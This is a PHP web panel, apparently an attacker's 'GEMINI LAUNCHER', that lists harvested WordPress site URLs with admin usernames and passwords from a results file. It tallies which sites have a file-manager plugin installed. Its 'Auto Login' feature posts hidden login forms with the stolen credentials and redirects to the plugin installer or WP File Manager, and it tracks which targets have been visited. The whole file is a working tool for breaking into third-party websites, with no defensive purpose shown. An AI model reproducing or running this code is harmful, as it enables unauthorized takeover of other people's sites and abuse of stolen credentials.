<?php
session_start();
error_reporting(0);

// ==========================================
//  KONFIGURASI UTAMA
// ==========================================
$pass_login = '1337'; 
$data_file  = 'live_results.txt';
$log_file   = 'visited_data.json'; 

// --- AJAX HANDLER ---
if (isset($_POST['action']) && $_POST['action'] == 'mark_visited') {
    $target_url = $_POST['url'];
    $current_data = file_exists($log_file) ? json_decode(file_get_contents($log_file), true) : [];
    if (!is_array($current_data)) $current_data = [];
    
    if (!in_array($target_url, $current_data)) {
        $current_data[] = $target_url;
        file_put_contents($log_file, json_encode($current_data));
    }
    exit('saved');
}

// --- LOGIKA LOGIN ---
if (isset($_POST['do_login'])) {
    if ($_POST['password'] === $pass_login) {
        $_SESSION['is_logged_in'] = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- LAUNCHER SYSTEM ---
if (isset($_GET['action']) && $_GET['action'] == 'login') {
    $url  = $_GET['u'];
    $user = $_GET['l'];
    $pass = $_GET['p'];
    $msg  = $_GET['m']; 

    $redirect_to = '/wp-admin/plugin-install.php?s=files&tab=search&type=term';
    if (
        stripos($msg, 'INSTALLED') !== false || 
        stripos($msg, 'ACTIVATED') !== false || 
        stripos($msg, 'Already Active') !== false || 
        stripos($msg, 'Success') !== false
    ) {
        $redirect_to = '/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw';
    }

    $base_url = preg_replace('/(wp-admin.*|wp-login\.php.*|\/)$/i', '', $url);
    $action_url = rtrim($base_url, '/') . '/wp-login.php';
    $final_redirect = rtrim($base_url, '/') . $redirect_to;
?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Authenticating...</title>
        <meta name="referrer" content="origin">
        <style>
            body{background:#131314;color:#e3e3e3;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}
            .loader{
                width: 50px; height: 50px; border-radius: 50%;
                background: conic-gradient(from 0deg, #4285f4, #9b72cb, #4285f4);
                animation: spin 1.5s linear infinite; margin-bottom: 20px;
                mask: radial-gradient(farthest-side, transparent calc(100% - 4px), #fff 0);
                -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 4px), #fff 0);
            }
            @keyframes spin { to { transform: rotate(360deg); } }
            .txt{font-size:12px;letter-spacing:2px; opacity: 0.8; font-weight:bold;}
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <div class="txt">SECURING ACCESS...</div>
        <form id="auto_form" action="<?= htmlspecialchars($action_url) ?>" method="POST" style="display:none;">
            <input type="text" name="log" value="<?= htmlspecialchars($user) ?>">
            <input type="password" name="pwd" value="<?= htmlspecialchars($pass) ?>">
            <input type="checkbox" name="rememberme" value="forever" checked>
            <input type="hidden" name="wp-submit" value="Log In">
            <input type="hidden" name="redirect_to" value="<?= htmlspecialchars($final_redirect) ?>">
        </form>
        <script>setTimeout(function(){ document.getElementById('auto_form').submit(); }, 300);</script>
    </body>
    </html>
<?php
    exit;
}

// --- GATEKEEPER ---
if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Locked</title>
    <style>
        body { background: #131314; color: #e3e3e3; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1e1f20; padding: 40px; border-radius: 16px; width: 100%; max-width: 320px; text-align: center; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 14px; margin: 20px 0; background: #0b0c0d; border: 1px solid #333; color: #fff; border-radius: 8px; text-align: center; outline: none; transition: 0.3s; font-size: 16px; }
        input:focus { border-color: #4285f4; box-shadow: 0 0 15px rgba(66, 133, 244, 0.1); }
        button { width: 100%; padding: 14px; background: #4285f4; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.3s; }
        button:hover { background: #3367d6; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="margin-top:0; font-weight:600; font-size:16px; letter-spacing:1px; color:#8ab4f8;">SYSTEM LOCKED</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="Passphrase" required autofocus>
            <button type="submit" name="do_login">AUTHENTICATE</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// --- DATA PREPARATION & DEDUPLICATION ---
$raw_lines = file_exists($data_file) ? file($data_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$visited_list = file_exists($log_file) ? json_decode(file_get_contents($log_file), true) : [];
if (!is_array($visited_list)) $visited_list = [];

// Filter Duplicate Domains
$lines = [];
$seen_domains = [];

foreach ($raw_lines as $l) {
    $parts = explode('|', $l);
    $creds = explode('#', trim($parts[0]));
    if (count($creds) < 3) continue;

    $u_temp = $creds[0];
    
    // Ambil Host/Domain utamanya saja untuk pengecekan duplikat
    $parsed = parse_url($u_temp);
    $host_check = isset($parsed['host']) ? $parsed['host'] : $u_temp;
    $host_check = strtolower(str_replace('www.', '', $host_check)); // Normalisasi

    if (!in_array($host_check, $seen_domains)) {
        $seen_domains[] = $host_check;
        $lines[] = $l;
    }
}

$total = count($lines);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GEMINI MANAGER</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #28292a;
            --border: #3c4043; --text-main: #e3e3e3; --text-muted: #9aa0a6;
            --accent: #8ab4f8; --success: #10b981; --warn: #fdd663;
            --danger: #ef4444; 
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg-body); color: var(--text-main); font-family: 'Inter', sans-serif; margin: 0; padding: 20px; font-size: 14px; }
        
        .wrapper { max-width: 950px; margin: 0 auto; }
        
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
        .logo { font-size: 20px; font-weight: 700; color: #fff; }
        .logo span { color: var(--accent); }
        .btn-logout { font-size: 11px; color: var(--text-muted); text-decoration: none; border: 1px solid var(--border); padding: 8px 16px; border-radius: 20px; transition: 0.2s; }
        .btn-logout:hover { border-color: var(--accent); color: var(--text-main); }
        
        .stats-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
        .stat-item { background: var(--bg-card); padding: 20px; border-radius: 16px; border: 1px solid var(--border); text-align: center; }
        .stat-val { display: block; font-family: 'JetBrains Mono'; font-size: 24px; font-weight: 700; margin-bottom: 5px; color: var(--text-main); }
        .stat-lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }

        .list-container { display: flex; flex-direction: column; gap: 8px; }
        .list-header { 
            display: grid; grid-template-columns: 40px 3fr 2fr 100px 60px; 
            padding: 0 25px 10px 25px; font-size: 11px; font-weight: 700; 
            text-transform: uppercase; color: var(--text-muted); opacity: 0.8; 
        }
        
        .item { 
            display: grid; grid-template-columns: 40px 3fr 2fr 100px 60px;
            background: var(--bg-card); padding: 18px 25px; 
            border-radius: 12px; border: 1px solid transparent; border-left: 3px solid transparent;
            align-items: center; transition: all 0.25s ease; position: relative;
        }
        .item:hover { 
            transform: translateY(-2px); background: var(--bg-hover);
            border-color: rgba(138, 180, 248, 0.2); box-shadow: 0 4px 20px rgba(0,0,0,0.3); z-index: 2;
        }
        
        /* FOCUS STYLE (HIJAU untuk Belum Login) */
        .item.mobile-focus {
            background: #232425; 
            border-left: 3px solid var(--success) !important;
            box-shadow: inset 10px 0 20px -10px rgba(16, 185, 129, 0.1);
        }

        /* VISITED STYLE (MERAH & TIDAK REDUP) */
        .item.visited { 
            opacity: 1; 
            filter: none; 
            border-left: 3px solid var(--danger) !important; 
            background: rgba(239, 68, 68, 0.05); 
        }
        
        .item.visited .btn-icon { 
            background: #3f1d1d; color: var(--danger); 
            border: 1px solid #7f1d1d; pointer-events: none; box-shadow: none;
        }
        
        .col-num { font-family: 'JetBrains Mono'; font-size: 12px; color: var(--accent); opacity: 0.6; }
        .col-url { font-family: 'Inter', sans-serif; color: var(--text-main); font-size: 14px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; padding-right: 15px; }
        
        .cred-box { display: flex; align-items: center; gap: 10px; font-family: 'JetBrains Mono'; font-size: 12px; color: var(--text-muted); }
        .pass-copy { 
            background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 4px; 
            cursor: pointer; color: var(--text-muted); transition: 0.2s; user-select: none; border: 1px solid transparent;
        }
        .pass-copy:hover { border-color: var(--accent); color: var(--accent); background: rgba(138, 180, 248, 0.1); }

        .col-status { text-align: left; }
        .badge { padding: 5px 10px; border-radius: 6px; font-size: 9px; font-weight: 700; text-transform: uppercase; display: inline-block; letter-spacing: 0.5px; }
        .b-fm { background: rgba(129, 201, 149, 0.1); color: var(--success); border: 1px solid rgba(129, 201, 149, 0.2); }
        .b-ad { background: rgba(253, 214, 99, 0.1); color: var(--warn); border: 1px solid rgba(253, 214, 99, 0.2); }

        .col-action { display: flex; justify-content: flex-end; }
        .btn-icon { 
            display: flex; align-items: center; justify-content: center; width: 36px; height: 36px;
            background: rgba(66, 133, 244, 0.1); color: #4285f4; text-decoration: none; border-radius: 8px; 
            transition: 0.2s; border: 1px solid transparent; cursor: pointer;
        }
        .btn-icon:hover { background: #4285f4; color: #fff; transform: scale(1.1); box-shadow: 0 0 15px rgba(66, 133, 244, 0.4); }
        .btn-icon svg { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; }

        /* =========================================
           MOBILE RESPONSIVE
           ========================================= */
        @media (max-width: 768px) {
            .list-header { display: none; }
            .wrapper { padding: 0; }
            
            .item {
                display: flex; flex-direction: column; align-items: flex-start; gap: 12px;
                padding: 18px 20px; position: relative;
            }

            /* ANGKA URUT */
            .col-num {
                display: block; 
                position: absolute; left: 20px; top: 18px; 
                font-weight: 700; opacity: 1; z-index: 5;
            }

            /* DOMAIN - PADDING LEBIH BESAR UNTUK ANTI-TABRAK */
            .col-url { 
                font-size: 16px; font-weight: 600; 
                padding-left: 35px; /* Jarak aman agar tidak ditimpa angka */
                width: calc(100% - 40px);
                white-space: nowrap; overflow: hidden; text-overflow: ellipsis; 
                margin-bottom: 5px;
            }
            
            .cred-box { 
                width: 100%; background: #18191a; padding: 12px; border-radius: 8px; 
                justify-content: space-between; border: 1px solid #2d2e30; 
            }
            
            .col-status { width: 100%; }
            .badge { display: block; text-align: center; width: fit-content; }
            
            /* TOMBOL LOGIN */
            .col-action { 
                position: absolute; 
                right: 20px; 
                top: 10px; 
            }
            .btn-icon { width: 40px; height: 40px; background: #222; border: 1px solid #333; }
        }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="logo">GEMINI <span>LAUNCHER</span></div>
        <a href="?logout=true" class="btn-logout">LOGOUT</a>
    </div>

    <div class="stats-bar">
        <div class="stat-item">
            <span class="stat-val"><?= $total ?></span>
            <span class="stat-lbl">Total Unique</span>
        </div>
        <div class="stat-item">
            <span class="stat-val" style="color:var(--success)">
                <?php $inst = 0; foreach($lines as $l) if(stripos($l,'INSTALLED')!==false || stripos($l,'Active')!==false || stripos($l,'Success')!==false) $inst++; echo $inst; ?>
            </span>
            <span class="stat-lbl">File Mgr</span>
        </div>
        <div class="stat-item">
            <span class="stat-val" style="color:var(--warn)"><?= $total - $inst ?></span>
            <span class="stat-lbl">Admin Only</span>
        </div>
    </div>

    <div class="list-container">
        <div class="list-header">
            <div>#</div>
            <div>Domain</div>
            <div>Credentials</div>
            <div>Status</div>
            <div style="text-align:right">Action</div>
        </div>

        <?php if($total > 0): $no=1; foreach($lines as $line): 
            $parts = explode('|', $line);
            $creds_raw = trim($parts[0]);
            $msg = isset($parts[1]) ? trim($parts[1]) : '';
            $c = explode('#', $creds_raw);
            if(count($c) < 3) continue;
            
            $url = $c[0]; $usr = $c[1]; $pwd = trim(implode('#', array_slice($c, 2)));
            
            $clean_url = preg_replace('#^https?://#', '', $url);
            $clean_url = preg_replace('#^www\.#', '', $clean_url);
            $clean_url = explode('/', $clean_url)[0];

            $is_fm = (stripos($msg,'INSTALLED')!==false || stripos($msg,'Active')!==false || stripos($msg,'Success')!==false);
            $badge = $is_fm ? '<span class="badge b-fm">FILE MGR</span>' : '<span class="badge b-ad">ADMIN</span>';
            $login_link = "?action=login&u=".urlencode($url)."&l=".urlencode($usr)."&p=".urlencode($pwd)."&m=".urlencode($msg);
            
            // CHECK VISITED
            $is_visited = in_array($url, $visited_list);
            $row_class = $is_visited ? 'visited' : '';
        ?>
            <div class="item <?= $row_class ?>" id="row-<?= $no ?>" onclick="setFocus(this)">
                <div class="col-num"><?= $no ?></div>
                <div class="col-url" title="<?= htmlspecialchars($url) ?>"><?= htmlspecialchars($clean_url) ?></div>
                
                <div class="cred-box">
                    <span><?= htmlspecialchars($usr) ?></span>
                    <span class="pass-copy" onclick="event.stopPropagation(); copyToClip('<?= addslashes($pwd) ?>', this)">***</span>
                </div>
                
                <div class="col-status"><?= $badge ?></div>
                
                <div class="col-action">
                    <?php if($is_visited): ?>
                        <div class="btn-icon">
                            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
                        </div>
                    <?php else: ?>
                        <a href="<?= $login_link ?>" target="_blank" class="btn-icon" onclick="event.stopPropagation(); markVisited('<?= $url ?>', this)" title="Auto Login">
                            <svg viewBox="0 0 24 24">
                                <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
                                <polyline points="10 17 15 12 10 7"></polyline>
                                <line x1="15" y1="12" x2="3" y2="12"></line>
                            </svg>
                        </a>
                    <?php endif; ?>
                </div>
            </div>
        <?php $no++; endforeach; else: ?>
            <div style="padding:50px; text-align:center; color:var(--text-muted)">No unique targets found.</div>
        <?php endif; ?>
    </div>
</div>

<script>
    function copyToClip(text, el) {
        navigator.clipboard.writeText(text).then(() => {
            let originalText = el.innerText;
            el.innerText = "COPIED";
            el.style.color = "#81c995"; el.style.borderColor = "#81c995";
            setTimeout(() => { el.innerText = originalText; el.style.color = ""; el.style.borderColor = ""; }, 1000);
        });
    }

    function markVisited(url, btn) {
        let formData = new FormData();
        formData.append('action', 'mark_visited');
        formData.append('url', url);
        fetch(window.location.href, { method: 'POST', body: formData })
        .then(res => {
            let item = btn.closest('.item');
            if(item) {
                item.classList.add('visited');
                item.classList.remove('mobile-focus');
                btn.parentElement.innerHTML = '<div class="btn-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>';
            }
        });
    }

    function setFocus(el) {
        if(el.classList.contains('visited')) return;
        document.querySelectorAll('.item').forEach(i => i.classList.remove('mobile-focus'));
        el.classList.add('mobile-focus');
    }
</script>

</body>
</html>
